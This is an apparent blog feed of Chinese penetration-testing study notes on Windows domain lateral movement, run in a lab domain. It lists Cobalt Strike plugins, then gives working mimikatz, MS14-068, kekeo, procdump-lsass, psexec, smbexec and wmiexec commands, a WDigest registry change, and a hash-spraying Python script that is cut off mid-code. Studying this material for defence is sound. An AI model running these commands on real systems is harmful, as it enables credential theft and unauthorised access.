<p>（Cobalt Strike插件）：<a href="https://github.com/vysecurity/Aggressor-VYSEC">https://github.com/vysecurity/Aggressor-VYSEC</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/ramen0x3f/AggressorScripts">https://github.com/ramen0x3f/AggressorScripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/threatexpress/persistence-aggressor-script">https://github.com/threatexpress/persistence-aggressor-script</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/threatexpress/aggressor-scripts">https://github.com/threatexpress/aggressor-scripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/branthale/CobaltStrikeCNA">https://github.com/branthale/CobaltStrikeCNA</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor">https://github.com/gaudard/scripts/tree/master/red-team/aggressor</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/vysec/Aggressor-VYSEC">https://github.com/vysec/Aggressor-VYSEC</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/threatexpress/aggressor-scripts">https://github.com/threatexpress/aggressor-scripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/threatexpress/red-team-scripts">https://github.com/threatexpress/red-team-scripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/vysecurity/CVE-2018-4878">https://github.com/vysecurity/CVE-2018-4878</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/QAX-A-Team/CobaltStrike-Toolset">https://github.com/QAX-A-Team/CobaltStrike-Toolset</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/ars3n11/Aggressor-Scripts">https://github.com/ars3n11/Aggressor-Scripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/michalkoczwara/aggressor_scripts_collection">https://github.com/michalkoczwara/aggressor_scripts_collection</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/killswitch-GUI/CobaltStrike-Toolkit">https://github.com/killswitch-GUI/CobaltStrike-Toolkit</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/ZonkSec/persistence-aggressor-script">https://github.com/ZonkSec/persistence-aggressor-script</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/Genetic-Malware/Ebowla">https://github.com/Genetic-Malware/Ebowla</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor">https://github.com/gaudard/scripts/tree/master/red-team/aggressor</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/branthale/CobaltStrikeCNA">https://github.com/branthale/CobaltStrikeCNA</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/oldb00t/AggressorScripts">https://github.com/oldb00t/AggressorScripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/p292/Phant0m_cobaltstrike">https://github.com/p292/Phant0m_cobaltstrike</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/p292/DDEAutoCS">https://github.com/p292/DDEAutoCS</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/secgroundzero/CS-Aggressor-Scripts">https://github.com/secgroundzero/CS-Aggressor-Scripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/skyleronken/Aggressor-Scripts">https://github.com/skyleronken/Aggressor-Scripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/tevora-threat/aggressor-powerview">https://github.com/tevora-threat/aggressor-powerview</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/tevora-threat/PowerView3-Aggressor">https://github.com/tevora-threat/PowerView3-Aggressor</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/threatexpress/persistence-aggressor-script">https://github.com/threatexpress/persistence-aggressor-script</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/C0axx/AggressorScripts">https://github.com/C0axx/AggressorScripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/offsecginger/AggressorScripts">https://github.com/offsecginger/AggressorScripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/tomsteele/cs-magik">https://github.com/tomsteele/cs-magik</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/bitsadmin/nopowershell">https://github.com/bitsadmin/nopowershell</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/SpiderLabs/SharpCompile">https://github.com/SpiderLabs/SharpCompile</a></p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>域横向PTH&amp;PTK&amp;PTT哈希票据传递</title>
    <url>/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&amp;PTK&amp;PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/</url>
    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="PTH-amp-PTT-amp-PTK"><a href="#PTH-amp-PTT-amp-PTK" class="headerlink" title="PTH&amp;PTT&amp;PTK"></a>PTH&amp;PTT&amp;PTK</h3><p>PTH(pass the hash)         利用<strong>lm或ntlm</strong>的值进行的渗透测试</p>
<p>PTT(pass the ticket)        利用的<strong>票据凭证TGT</strong>进行的渗透测试</p>
<p>PTK(pass the key)           利用的<strong>ekeys aes256</strong>进行的渗透测试</p>
<h3 id="PTH和PTK"><a href="#PTH和PTK" class="headerlink" title="PTH和PTK"></a>PTH和PTK</h3><p>PTH原理是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
<p>如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012等，可以使用AES keys代替NT hash来实现ptk攻击</p>
<h4 id="总结KB2871997补丁后的影响"><a href="#总结KB2871997补丁后的影响" class="headerlink" title="总结KB2871997补丁后的影响"></a>总结KB2871997补丁后的影响</h4><p>PTH：没打补丁用户都可以连接，打了补丁只能administrator远程ipc连接</p>
<p>PTK：打了补丁才能用户都可以连接，采用aes256连接</p>
<p>查看补丁：用<code>systeminfo</code>命令</p>
<p>参考：<a href="https://www.freebuf.com/column/220740.html">KB22871997是否真的能防御PTH攻击</a></p>
<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220311233849808.png" alt="image-20220311233849808"></p>
<h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><p>PTT攻击的部分就不是简单的NTLM认证了，它是利用<strong>Kerberos协议</strong>进行攻击的，这里就介绍三种常见的攻击方法：<strong>MS14-068</strong>，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。</p>
<p>MS14-068基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)</p>
<p>其中Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术</p>
<p>MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780</p>
<h4 id="Kerberos协议工作方法"><a href="#Kerberos协议工作方法" class="headerlink" title="Kerberos协议工作方法"></a>Kerberos协议工作方法</h4><p>客户机将明文密码进行NTLM哈希,然后和时间戳一起加密（使用krbtgt密码hash作为密钥），发送给kdc（域控），kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)。</p>
<p>将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据。</p>
<p>然后客户机将TGT发送给域控制器KDC请求TGS（票证授权服务）票证，并且对TGT进行检测。</p>
<p>检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。</p>
<h2 id="域横向移动PTH传递-mimikatz"><a href="#域横向移动PTH传递-mimikatz" class="headerlink" title="域横向移动PTH传递-mimikatz"></a>域横向移动PTH传递-mimikatz</h2><p>使用mimikatz先获取hash（假设获取到的就是域控的ntlm）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">privilege::debug sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220311230845494.png" alt="image-20220311230845494"></p>
<p>在未打补丁的工作组及域连接：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line"><span class="comment"># domain的值为workgroup时，连接的是本地用户</span></span><br></pre></td></tr></table></figure>

<p>成功会自动创建一个cmd，可以通过该cmd操作对应用户名的机器，如查看C盘目录(若IP地址不识别可以换成计算机名)</p>
<pre><code>dir \\192.168.3.21\c$
</code></pre>
<p>注意：这里/domain:god.org是对域内用户进行PTH，我理解的是经过操作后弹出的cmd具有对域内主机PTH的功能，所以还需要在弹出的cmd中测试出哪个或哪些主机对应该ntlm值(另外用户名也是不确定的)</p>
<h2 id="域横向移动PTK传递-mimikatz"><a href="#域横向移动PTK传递-mimikatz" class="headerlink" title="域横向移动PTK传递-mimikatz"></a>域横向移动PTK传递-mimikatz</h2><p>打补丁后的工作组及域连接：</p>
<p>mimikatz获取权限</p>
<pre><code>privilege::debug
</code></pre>
<p>之后获取aes值</p>
<pre><code>sekurlsa::ekeys
</code></pre>
<p>ptk传递</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sekurlsa</span>::pth /user:mary /domain:god.org /aes<span class="number">256</span>:d<span class="number">7</span>c<span class="number">1</span>d<span class="number">9310753</span>a<span class="number">2</span>f<span class="number">7</span>f<span class="number">24035</span>b<span class="number">2701</span>dc<span class="number">1</span>e<span class="number">6177</span>d<span class="number">16</span>a<span class="number">6</span>e<span class="number">40</span>af<span class="number">3</span>c<span class="number">5</span>cdff<span class="number">814719821</span>c<span class="number">4</span>b</span><br></pre></td></tr></table></figure>





<h2 id="域横向移动PTT传递-MS14068-amp-kekeo-amp-local"><a href="#域横向移动PTT传递-MS14068-amp-kekeo-amp-local" class="headerlink" title="域横向移动PTT传递-MS14068&amp;kekeo&amp;local"></a>域横向移动PTT传递-MS14068&amp;kekeo&amp;local</h2><h4 id="第一种利用漏洞ms14-068"><a href="#第一种利用漏洞ms14-068" class="headerlink" title="第一种利用漏洞ms14-068"></a>第一种利用漏洞ms14-068</h4><p>能实现普通用户直接获取域控system权限</p>
<p>1.查看当前sid</p>
<pre><code>whoami /user
</code></pre>
<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312001825724.png" alt="image-20220312001825724"></p>
<p>2.启动mimikatz，<strong>不需要提升权限</strong>，能用就行</p>
<p>清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</p>
<pre><code>kerberos::purge
</code></pre>
<p>查看当前机器凭证</p>
<pre><code>kerberos::list
</code></pre>
<p>将票据注入到内存中</p>
<pre><code>kerberos::ptc 票据文件
</code></pre>
<p>3.利用ms14-068生成TGT数据</p>
<pre><code>ms14-068.exe -u 域成员名@域名 -s sid -d 域控IP地址 -p 域成员密码

# 例
MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 - p admin!@#45
</code></pre>
<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312001958899.png" alt="image-20220312001958899"></p>
<p>4.票据注入内存</p>
<pre><code>kerberos::ptc TGT_mary@god.org.ccache
</code></pre>
<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312002203743.png" alt="image-20220312002203743"></p>
<p>5.查看凭证列表</p>
<pre><code>klist
</code></pre>
<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312002227026.png" alt="image-20220312002227026"></p>
<p>6.利用</p>
<pre><code>dir \\主机名\c$
</code></pre>
<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312002420045.png" alt="image-20220312002420045"></p>
<p>这里是对域控攻击所以net time /domain查主机名</p>
<h3 id="第二种利用工具kekeo"><a href="#第二种利用工具kekeo" class="headerlink" title="第二种利用工具kekeo"></a>第二种利用工具kekeo</h3><p>1.生成票据</p>
<pre><code>./kekeo &quot;tgt::ask /user:域成员名 /domain:域名 /ntlm:ntlm值&quot;

./kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695d……&quot;
</code></pre>
<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312003010504.png" alt="image-20220312003010504"></p>
<p>2.导入票据</p>
<pre><code>kerberos::ptt 票据文件

kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
</code></pre>
<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312003037687.png" alt="image-20220312003037687"></p>
<p>3.查看凭证</p>
<pre><code>klist
</code></pre>
<p>4.利用net use载入</p>
<pre><code>dir \\192.168.3.21\c$
</code></pre>
<h3 id="第三种利用本地票据（需管理权限）"><a href="#第三种利用本地票据（需管理权限）" class="headerlink" title="第三种利用本地票据（需管理权限）"></a>第三种利用本地票据（需管理权限）</h3><p>利用<strong>mimikatz</strong>收集本地票据，再将票据导入到内存中进行连接。有存活时间限制（之前有人用这台被拿下的主机连结过域控，就会存在相关凭据，我们的目的就是导出所有凭据，找到与连结过域控的凭据）</p>
<pre><code>privilege::debug

sekurlsa::tickets /export

kerberos::ptt 票据文件
</code></pre>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>ptt传递不需本地管理员权限，连接时主机名连接，基于漏洞、工具、本地票据</p>
<h2 id="国产Ladon内网杀器测试-信息收集，连接等"><a href="#国产Ladon内网杀器测试-信息收集，连接等" class="headerlink" title="国产Ladon内网杀器测试-信息收集，连接等"></a>国产Ladon内网杀器测试-信息收集，连接等</h2><p>信息收集-协议扫描-漏洞探针-传递攻击等</p>
<p>“Wiki”界面有命令介绍</p>
<p>信息收集</p>
<p>GUI：“scan”界面选“scan”，“OnlinePC”界面右键选“OnlinePC”扫描</p>
<p>命令行：Ladon [网段] [关键词]</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/bmjoker/p/10355979.html">内网渗透之PTH&amp;PTT&amp;PTK</a></p>
<p>Kerberos协议工作原理：<a href="https://blog.csdn.net/qq_32005671/article/details/54862678">https://blog.csdn.net/qq_32005671/article/details/54862678</a></p>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>Ladon：<a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
<p>Ladon 9.1.1 &amp; CobaltStrike神龙插件发布：<a href="http://k8gege.org/Ladon/cs911.html">http://k8gege.org/Ladon/cs911.html</a></p>
<p>kekeo：<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
<p>WindowsExploits/MS14-068：<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>域横向smb&amp;wmi明文或hash传递</title>
    <url>/2022/03/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91smb&amp;wmi%E6%98%8E%E6%96%87%E6%88%96hash%E4%BC%A0%E9%80%92/</url>
    <content><![CDATA[<p><img src="/2022/03/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91smb&wmi%E6%98%8E%E6%96%87%E6%88%96hash%E4%BC%A0%E9%80%92/image-20220310104214086.png" alt="image-20220310104214086"></p>
<p><img src="/2022/03/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91smb&wmi%E6%98%8E%E6%96%87%E6%88%96hash%E4%BC%A0%E9%80%92/image-20220310164740622.png" alt="image-20220310164740622"></p>
<h2 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h2><p>Windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码</p>
<p>Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码</p>
<p>针对以上情况，我们提供了4种方式解决此类问题</p>
<ol>
<li>利用哈希hash传递（pth、ptk等）进行移动</li>
<li>利用其它服务协议（SMB、WMI等）进行哈希移动</li>
<li>利用注册表操作开启Wdigest Auth值进行获取。修改注册表：<code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 作者：shtome https://www.bilibili.com/read/cv14518781 出处：bilibili</code></li>
<li>利用工具或第三方平台（Hachcat）进行破解获取</li>
</ol>
<h2 id="知识点2"><a href="#知识点2" class="headerlink" title="知识点2"></a>知识点2</h2><p>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p>
<h2 id="Procdump-Mimikatz配合获取密码"><a href="#Procdump-Mimikatz配合获取密码" class="headerlink" title="Procdump+Mimikatz配合获取密码"></a>Procdump+Mimikatz配合获取密码</h2><p>当mimikatz获取密码失败或被杀时，可以配合procdump来获取密码</p>
<p>先将<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">procdump</a>上传至目标机器，运行生成.dump文件</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">procdump -accepteula -<span class="keyword">ma</span> lsass.<span class="keyword">exe</span> lsass.dmp</span><br></pre></td></tr></table></figure>

<p>然后将.dump文件拷贝到攻击机上使用mimikatz来获取密码</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">sekurlsa<span class="type">::minidump</span> lsass.dmp</span><br><span class="line"></span><br><span class="line">sekurlsa<span class="type">::logonPasswords</span> <span class="literal">full</span></span><br></pre></td></tr></table></figure>

<p>附两款提取密码的软件</p>
<p>Pwdump7</p>
<p>QuarksPwdump</p>
<h2 id="Hashcat破解获取Windows-NTML-Hash"><a href="#Hashcat破解获取Windows-NTML-Hash" class="headerlink" title="Hashcat破解获取Windows NTML Hash"></a>Hashcat破解获取Windows NTML Hash</h2><pre><code>hashcat -a 0 -m 1000 hash file --force
# -a 0 表示采用字典破解
# -m 1000表示指向什么协议，这里时NTLM
# hash 传输形式
</code></pre>
<p>该工具还支持更多密码破解</p>
<p>Hashcat：<a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p>
<p>密码破解全能工具：Hashcat密码破解攻略：<a href="https://www.freebuf.com/sectool/164507.html">https://www.freebuf.com/sectool/164507.html</a></p>
<h2 id="域横向移动SMB服务利用-psexec、smbexec（官方自带）"><a href="#域横向移动SMB服务利用-psexec、smbexec（官方自带）" class="headerlink" title="域横向移动SMB服务利用-psexec、smbexec（官方自带）"></a>域横向移动SMB服务利用-psexec、smbexec（官方自带）</h2><p><strong>利用SMB服务</strong>可以通过明文或hash传递来远程执行，条件<strong>445服务端口开放</strong>（hash传递需要借助第三方工具，官方Pstools无法采用hash连接）</p>
<h3 id="psexec第一种：先有ipc连接"><a href="#psexec第一种：先有ipc连接" class="headerlink" title="psexec第一种：先有ipc连接"></a>psexec第一种：先有ipc连接</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.32</span>\ipc<span class="variable">$</span> <span class="string">&quot;admin!@#45&quot;</span> /user:administrator</span><br><span class="line"></span><br><span class="line">psexec \\<span class="number">192.168</span>.<span class="number">3.32</span> <span class="literal">-s</span> cmd <span class="comment"># 需要现有ipc连接，-s以system权限运行</span></span><br></pre></td></tr></table></figure>

<h3 id="psexec第二种：不用建立IPC连接直接提供密码"><a href="#psexec第二种：不用建立IPC连接直接提供密码" class="headerlink" title="psexec第二种：不用建立IPC连接直接提供密码"></a>psexec第二种：不用建立IPC连接直接提供密码</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 官方自带的psexec只能传递明文</span></span><br><span class="line">psexec \\<span class="number">192.168</span>.<span class="number">3.21</span> <span class="literal">-u</span> administrator <span class="literal">-p</span> Admin12345 <span class="literal">-s</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 工具包impacket里的psexec</span></span><br><span class="line">psexec <span class="literal">-hashes</span> :<span class="number">518</span>b98ad4178a53695dc997aa0wd455c ./administrator@<span class="number">192.168</span>.<span class="number">3.32</span></span><br></pre></td></tr></table></figure>



<h2 id="第三方工具smbexec无需ipc连接，支持明文和hash传递"><a href="#第三方工具smbexec无需ipc连接，支持明文和hash传递" class="headerlink" title="第三方工具smbexec无需ipc连接，支持明文和hash传递"></a>第三方工具smbexec无需ipc连接，支持明文和hash传递</h2><p>用法和psexec差不多</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">smbexec god/administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span></span><br><span class="line"></span><br><span class="line">smbexec <span class="literal">-hashes</span> :<span class="number">518</span>b98ad4178a53695dc997aa0wd455c ./administrator@<span class="number">192.168</span>.<span class="number">3.32</span> <span class="comment"># 目前hash值一般都是NTLM的</span></span><br></pre></td></tr></table></figure>



<h2 id="域横向移动WMI服务利用-cscript、wmiexec、wmic"><a href="#域横向移动WMI服务利用-cscript、wmiexec、wmic" class="headerlink" title="域横向移动WMI服务利用-cscript、wmiexec、wmic"></a>域横向移动WMI服务利用-cscript、wmiexec、wmic</h2><p>WMI(Windows Management Instrumentation)是通过<strong>135端口</strong>进行利用，支持用户名明文或者hash的方式进行认证，并且<strong>该方法不会在目标日志系统留下痕迹</strong>。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自带WMIC 明文传递 无回显</span></span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">3.21</span> /user:administrator /password:Admin12345 <span class="keyword">process</span> call create <span class="string">&quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span> <span class="comment"># 需要将结果保存到文件中查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自带cscript 明文传递 有回现</span></span><br><span class="line">cscript //nologo wmiexec.vbs /shell <span class="number">192.168</span>.<span class="number">3.21</span> administrator Admin12345 <span class="comment"># 需要借助wmiexec.vbs，github上找的到</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 套件impacket wmiexec 明文或hash传递 有回现</span></span><br><span class="line">wmiexec ./administrator:admin!<span class="number">45</span>@<span class="number">192.168</span>.<span class="number">3.32</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line">wmiexec <span class="literal">-hashes</span> :<span class="number">518</span>b98ad4178a53695dc997aa02d455c ./administrator@<span class="number">192.168</span>.<span class="number">3.32</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="横向移动对于以上服务hash批量利用-python编译成exe"><a href="#横向移动对于以上服务hash批量利用-python编译成exe" class="headerlink" title="横向移动对于以上服务hash批量利用-python编译成exe"></a>横向移动对于以上服务hash批量利用-python编译成exe</h2><p>参考之前的python代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用代码</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1.安装pyinstaller</span></span><br><span class="line"><span class="string">pip install pyinstaller</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.生成可执行EXE</span></span><br><span class="line"><span class="string">Pyinstaller -F py文件</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3.会生成一个同名的exe文件</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.33&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users=&#123;<span class="comment"># 通过net user /domain收集</span></span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;s</span><br><span class="line"></span><br><span class="line">hashs=&#123;</span><br><span class="line">    <span class="string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ccef208c6485269c20db2cad21734fe7&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> _<span class="built_in">hash</span> <span class="keyword">in</span> hashs:</span><br><span class="line">            <span class="built_in">exec</span>=<span class="string">&quot;wmiexec -hashes :&quot;</span>+_<span class="built_in">hash</span>+<span class="string">&quot;god/&quot;</span>+user+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span> <span class="comment"># 对于域用户</span></span><br><span class="line">            exec1=<span class="string">&quot;wmiexec -hashes :&quot;</span>+_<span class="built_in">hash</span>+<span class="string">&quot;./&quot;</span>+user+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span> <span class="comment"># 对于本地用户</span></span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span>+<span class="built_in">exec</span>+<span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            <span 